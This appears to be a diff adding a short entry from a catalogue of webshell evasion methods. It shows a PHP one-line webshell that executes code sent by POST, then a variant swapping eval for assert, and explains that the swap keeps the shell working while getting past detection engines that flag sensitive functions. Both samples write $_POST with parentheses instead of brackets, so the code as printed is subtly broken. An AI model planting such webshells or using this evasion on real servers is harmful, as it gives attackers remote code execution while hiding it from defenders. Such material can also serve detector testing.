@@ -1,0 +1,15 @@
+Original webshell sample:
+
+'''
+<?php @eval($_POST('a'));?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php @assert($_POST('a'));?>
+'''
+
+Description:
+
+This approach replaces the "eval" function in the original webshell sample with an "assert" function, but does not affect the functionality of the webshell itself. This method can effectively bypass the detection engine for sensitive functions (i.e. eval, system, etc.), but please be careful to ensure the validity of the original webshell sample when using this method.
